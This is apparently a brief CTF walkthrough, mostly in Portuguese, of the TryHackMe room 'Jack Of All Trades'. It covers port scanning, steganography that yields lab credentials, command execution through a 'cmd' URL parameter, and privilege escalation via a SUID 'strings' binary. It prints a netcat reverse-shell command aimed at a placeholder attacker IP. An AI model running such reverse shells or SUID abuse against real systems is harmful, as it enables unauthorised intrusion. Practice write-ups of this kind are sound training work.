# Jack Of All Trades
https://tryhackme.com/room/jackofalltrades

## Recon

### NMAP

PORT   STATE SERVICE VERSION
    22/tcp open  http    Apache httpd 2.4.10 ((Debian))
    80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


### Stego

- No site existe uma base64 que ao decodificar, nos da a senha __u?WtKSraq__
- Essa senha consegue abrir as imagens stego.jpg e __header.jpg__ onde tem a conta cms -> jackinthebox:TplFxiSHjY

### RCE

- Na página principal existe um comentario de um página __/recovery.php__
- As credenciais escondidas no __header.jpg__ são usadas para login
- O /index.php aceita parametro __cmd__ -> /index.php?cmd=nc <IP> 4444 e- /bin/sh

## Privesc

- Em /home existe uma lista com hashes da senha de jack para ssh -> jack:ITMJpGGIqg1jn?>@
- O binário /usr/bin/strings tem permissão suid que da para pegar a ultima flag em /root/root.txt
